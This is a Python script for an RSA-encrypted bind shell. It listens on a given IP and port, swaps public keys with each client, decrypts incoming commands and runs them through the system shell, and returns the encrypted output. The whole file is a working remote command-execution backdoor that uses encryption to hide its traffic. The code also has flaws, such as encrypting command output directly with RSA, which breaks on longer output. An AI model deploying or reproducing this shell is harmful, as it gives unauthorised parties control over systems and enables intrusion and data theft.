import socket
import threading
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import sys
import subprocess
# Gen Keys
bit_size = 2048
keys = RSA.generate(bit_size)

# Export public Key returns the public key in binary format
bin_exported_Key = keys.publickey().export_key()
bin_exported_Key_len = len(bin_exported_Key)

key_len = len(bin_exported_Key)
bin_exported_Key_len = str(key_len).encode('utf-8')
bin_exported_Key_len += b' ' * (128 - len(bin_exported_Key_len))

# Generate a decypher object With Server Keys
decipher_rsa = PKCS1_OAEP.new(keys)

# Socket Settings
try:
    PORT = int(sys.argv[2])
    HOST = sys.argv[1]
except:
    print(F'Usage: python {sys.argv[0]} <IP> <PORT>')

# Initialize Settings
SERVER = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
SERVER.bind((HOST,PORT))


def New_Client(Socket):

# PROTOCOL STEP 1 Send Server Public KEY
    Socket.send(bin_exported_Key_len)
    Socket.send(bin_exported_Key)

    print('[PROTOCOL] 1 Sent Server KEY')
    
# PROTOCOL STEP 2 Recive Client Public KEY
    Client_Key_len = Socket.recv(128)
    if Client_Key_len:
        Client_key = Socket.recv(int(Client_Key_len))

        KEY = RSA.import_key(Client_key)
        cipher_rsa = PKCS1_OAEP.new(KEY)
        print('[PROTOCOL] 2 Recived Client Public Key')


# PROTOCOL STEP 3 Start Shell
        print('[PROTOCOL] 3 Start SHELL')
    while True:

        # Recive Message
        msg_len = Socket.recv(128).decode('utf-8')
        if msg_len:
            msg_len = int(msg_len)
            msg = Socket.recv(msg_len)

            dec_data = decipher_rsa.decrypt(msg).decode('utf-8')
            print(dec_data)

            out = subprocess.run(dec_data, shell=True, capture_output=True)

        
        # Send Message
            
            message = cipher_rsa.encrypt(out.stdout)

            msg_len = len(message)
            send_len = str(msg_len).encode('utf-8')
            send_len += b' ' * (128 - len(send_len))

            Socket.send(send_len)
            Socket.send(message)
            

def main(server):
    server.listen()
    print(F'[STATUS] Server started on {HOST}:{PORT}')

    # Wait For New Connections
    while True:
        client_socket, address = server.accept()
        print(F'[CONNECTION] New Connection from {address}')
        newTrhead = threading.Thread(target = New_Client, args=(client_socket,))
        newTrhead.start()
        

if __name__ == '__main__':
    main(SERVER)